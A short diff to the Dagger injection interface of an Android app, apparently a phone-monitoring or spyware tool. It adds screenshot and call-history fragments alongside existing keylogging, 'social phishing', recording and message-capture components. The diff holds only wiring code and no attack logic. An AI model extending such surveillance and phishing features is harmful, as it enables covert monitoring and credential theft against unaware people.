@@ -8,6 +8,7 @@ import com.github.midros.istheapp.ui.activities.register.RegisterActivity
 import com.github.midros.istheapp.ui.activities.login.LoginActivity
 import com.github.midros.istheapp.ui.activities.mainchild.MainChildActivity
 import com.github.midros.istheapp.ui.activities.socialphishing.SocialActivityM
+import com.github.midros.istheapp.ui.fragments.callhistory.FragmentCallhistory
 import com.github.midros.istheapp.ui.fragments.calls.CallsFragment
 import com.github.midros.istheapp.ui.fragments.photo.PhotoFragment
 import com.github.midros.istheapp.ui.fragments.keylog.KeysFragment
@@ -15,6 +16,7 @@ import com.github.midros.istheapp.ui.fragments.maps.MapsFragment
 import com.github.midros.istheapp.ui.fragments.message.MessageFragment
 import com.github.midros.istheapp.ui.fragments.notifications.NotifyMessageFragment
 import com.github.midros.istheapp.ui.fragments.recording.RecordingFragment
+import com.github.midros.istheapp.ui.fragments.screenshot.FragmentScreenshot
 import com.github.midros.istheapp.ui.fragments.social.SocialFragment
 import dagger.Component
 
@@ -38,5 +40,8 @@ interface ActivityComponent {
     fun inject(socialFragment: SocialFragment)
     fun inject(recordingFragment: RecordingFragment)
     fun inject(notifyMessageFragment: NotifyMessageFragment)
+
+    fun inject(screenshot: FragmentScreenshot)
+    fun inject(callhistory: FragmentCallhistory)
 
 }
